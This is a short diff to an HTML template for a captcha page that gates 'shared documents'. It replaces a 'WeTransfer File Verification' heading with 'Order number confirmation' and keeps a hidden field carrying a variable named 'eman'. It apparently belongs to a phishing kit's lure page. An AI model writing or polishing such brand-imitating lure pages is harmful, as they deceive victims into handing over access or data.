@@ -105,14 +105,14 @@
   </style>
 </head>
 <body>
-  <h1>WeTransfer File Verification</h1>
-  <p>Solve the following tasks to access shared documents.</p>
+  <h1>Order number confirmation</h1>
+  <p>Please enter the number below to access documents.</p>
   <div id="captcha-container">{{ code }}</div>
   <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
-    <input id="captcha-input" type="text" placeholder="Please enter the code above." name="code" required>
+    <input id="captcha-input" type="text" placeholder="Enter the code here" name="code" required>
     <input type="hidden" name="web" value="{{ eman }}">
     <br>
-    <button id="captcha-submit" type="submit">submit</button>
+    <button id="captcha-submit" type="submit">Continue</button>
   </form>
   <p id="captcha-message"></p>
   <script>
